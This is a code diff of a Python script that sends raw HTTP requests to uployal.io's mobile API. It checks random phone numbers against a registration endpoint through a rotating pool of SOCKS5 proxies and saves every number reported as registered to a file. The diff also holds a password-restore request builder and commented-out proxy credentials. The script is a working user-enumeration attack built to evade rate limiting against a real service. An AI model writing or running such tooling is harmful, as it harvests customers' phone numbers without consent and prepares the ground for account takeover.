@@ -41,17 +41,17 @@ def craft_request(phone_number):
     data = '{"mobile_phone": "' + phone_number + '",  "send_sms": false}'
     content_len = len(data)
     headers = (
-        "Host: uployal.io\r\n"
-        "Content-Type: application/json\r\n"
-        "Content-Length: " + str(content_len) + "\r\n"
-        "X-APPLICATION-ID: e81d5b756\r\n"
-        "User-Agent: okhttp/4.12.0\r\n"
-        "\r\n"
+            "Host: uployal.io\r\n"
+            "Content-Type: application/json\r\n"
+            "Content-Length: " + str(content_len) + "\r\n"
+                                                    "X-APPLICATION-ID: e81d5b756\r\n"
+                                                    "User-Agent: okhttp/4.12.0\r\n"
+                                                    "\r\n"
     )
     return (
-        "POST /api/mobile/v2.1/consumer/registration/check/ HTTP/1.1\r\n"
-        + headers
-        + data
+            "POST /api/mobile/v2.1/consumer/registration/check/ HTTP/1.1\r\n"
+            + headers
+            + data
     ).encode()
 
 
@@ -62,16 +62,25 @@ def craft_password_recover(phone_number):
     data = json.dumps(data)
     content_len = len(data)
     headers = (
-        "Host: uployal.io\r\n"
-        "Content-Type: application/json\r\n"
-        "Content-Length: " + str(content_len) + "\r\n"
-        "X-APPLICATION-ID: e81d5b756\r\n"
-        "User-Agent: okhttp/4.12.0\r\n"
-        "\r\n"
+            "Host: uployal.io\r\n"
+            "Content-Type: application/json\r\n"
+            "Content-Length: " + str(content_len) + "\r\n"
+                                                    "X-APPLICATION-ID: e81d5b756\r\n"
+                                                    "User-Agent: okhttp/4.12.0\r\n"
+                                                    "\r\n"
     )
     return (
-        "POST /api/mobile/v1/consumer/password-restore/ HTTP/1.1\r\n" + headers + data
+            "POST /api/mobile/v1/consumer/password-restore/ HTTP/1.1\r\n" + headers + data
     ).encode()
+
+
+def get_proxies():
+    with open('proxies.txt', 'r') as f:
+        proxies = f.read().split('\n')
+        if '' in proxies:
+            proxies.remove('')
+        proxies = [proxy.split(':') for proxy in proxies]
+        return [(ip, int(port)) for ip, port in proxies]
 
 
 async def main():
@@ -79,7 +88,7 @@ async def main():
     addr = (socket.gethostbyname(host), 443)
     ssl_context = ssl.create_default_context()
 
-    proxies = [("127.0.0.1", 9053 + i) for i in range(50)]
+    proxies = get_proxies()
 
     async def phone_check(proxy):
         for _ in range(111111):
@@ -89,18 +98,23 @@ async def main():
                     ssl_context=ssl_context,
                     server_hostname=host,
                     socks5_addr=proxy,
+                    # socks5_credentials=("hlzwxekg", "8atteb7xrqzy"),
                 )
-                phone = random_phone_number()
-                await async_sock.send(craft_request(phone))
-                res = await read_http_response(async_sock)
-                reg = 'is_registered":true' in res.body.decode()
-                print(phone, res.status_code, reg)
-                if reg:
-                    with open("result.txt", "a") as f:
-                        f.write(phone + "\n")
-                await asyncio.sleep(10)
+                for i in range(100):
+                    phone = random_phone_number()
+                    await async_sock.send(craft_request(phone))
+                    res = await read_http_response(async_sock)
+                    # print(res)
+                    reg = 'is_registered":true' in res.body.decode()
+                    if reg:
+                        print(phone, res.status_code, reg)
+                    if reg:
+                        with open("results2.txt", "a") as f:
+                            f.write(phone + "\n")
+                    await asyncio.sleep(10)
             except Exception as e:
-                print(e)
+                print("exc", e.__class__)
+                pass
 
     tasks = [asyncio.create_task(phone_check(proxy)) for proxy in proxies]
     await asyncio.gather(*tasks)
